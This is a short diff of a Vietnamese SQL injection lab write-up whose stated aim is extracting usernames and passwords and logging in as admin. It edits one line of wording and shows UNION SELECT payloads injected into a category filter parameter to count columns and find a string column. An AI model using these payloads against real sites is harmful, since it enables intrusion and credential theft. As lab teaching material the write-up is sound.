@@ -21,7 +21,7 @@ Trích xuất tất cả username và password sau đó đăng nhập với tài
     filter?category=Gifts'+UNION+SELECT+NULL,NULL--
     ```
   - **Kết quả**: Xác định 2 cột.
-- Xác nhận Cột hiển thị chuỗi bằng:
+- Xác định số Cột hiển thị chuỗi bằng:
   ```
   Payload:
   filter?category=Gifts'+UNION+SELECT+'test',NULL--
